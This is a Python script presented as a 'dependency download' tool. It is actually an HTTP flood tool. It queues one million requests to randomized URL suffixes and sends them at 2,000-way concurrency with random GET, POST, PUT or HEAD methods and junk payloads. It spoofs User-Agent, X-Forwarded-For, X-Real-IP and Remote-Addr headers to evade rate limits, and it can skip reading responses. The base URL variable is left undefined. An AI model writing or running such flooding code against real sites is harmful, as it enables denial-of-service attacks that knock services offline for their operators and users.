import asyncio, random, string, httpx, uvloop
from datetime import datetime
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())








user_agent_templates = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{version}) Gecko/20100101 Firefox/{version}"
]

def generate_random_user_agent():
    template = random.choice(user_agent_templates)
    version = f"{random.randint(80, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}"
    return template.format(version=version)

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_payload():
    return {"data": "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 1000)))}

def generate_random_url():
    random_suffix = ''.join(random.choices(string.ascii_letters, k=25))
    return f"{dependency_url}{random_suffix}"

async def download_dependency(client, method, url, stats, no_response):
    headers = {"User-Agent": generate_random_user_agent(), "X-Real-IP": generate_random_ip(), "X-Forwarded-For": generate_random_ip(), "Remote-Addr": generate_random_ip()}
    payload = generate_random_payload() if method in ["POST", "PUT"] else None
    try:
        if method == "GET":
            response = await client.get(url, headers=headers)
        elif method == "POST":
            response = await client.post(url, headers=headers, json=payload)
        elif method == "PUT":
            response = await client.put(url, headers=headers, json=payload)
        elif method == "HEAD":
            response = await client.head(url, headers=headers)
        else:
            print(f"Unsupported method: {method}")
            return
        
        stats['total_requests'] += 1
        if not no_response:
            stats['total_response_size'] += len(response.content)
            if response.status_code != 200:
                stats['non_200_responses'] += 1
                print(f"Request failed with status code: {response.status_code}")
            else:
                stats['total_responses'] += 1
    except httpx.RequestError as e:
        stats['failed_requests'] += 1
        print(f"Request failed: {e}")

async def worker(client, queue, stats, method, no_response):
    while True:
        url = await queue.get()
        await download_dependency(client, method, url, stats, no_response)
        queue.task_done()

async def main():
    total_downloads = 1000000
    num_concurrent_requests = 2000
    download_method = random.choice(["GET", "POST", "PUT", "HEAD"])
    no_response_needed = True
    download_stats = {
        'total_requests': 0,
        'total_responses': 0,
        'non_200_responses': 0,
        'failed_requests': 0,
        'total_response_size': 0
    }
    
    limits = httpx.Limits(max_keepalive_connections=10000, max_connections=100000)
    timeout = httpx.Timeout(timeout=30.0)
    
    async with httpx.AsyncClient(limits=limits, timeout=timeout) as client:
        queue = asyncio.Queue()
        # 每次请求生成不同的随机URL
        for _ in range(total_downloads):
            random_url = generate_random_url()
            await queue.put(random_url)
        
        tasks = []
        for _ in range(num_concurrent_requests):
            task = asyncio.create_task(worker(client, queue, download_stats, download_method, no_response_needed))
            tasks.append(task)
        
        await queue.join()
        
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    
    total_traffic_gb = download_stats['total_response_size'] / (1024 ** 3)
    print(f"总下载次数: {download_stats['total_requests']}")
    print(f"成功下载次数: {download_stats['total_responses']}")
    print(f"下载失败次数: {download_stats['non_200_responses']}")
    print(f"请求异常次数: {download_stats['failed_requests']}")
    print(f"总响应流量: {total_traffic_gb:.2f} GB")
    print("依赖下载完成")

if __name__ == "__main__":
    asyncio.run(main())
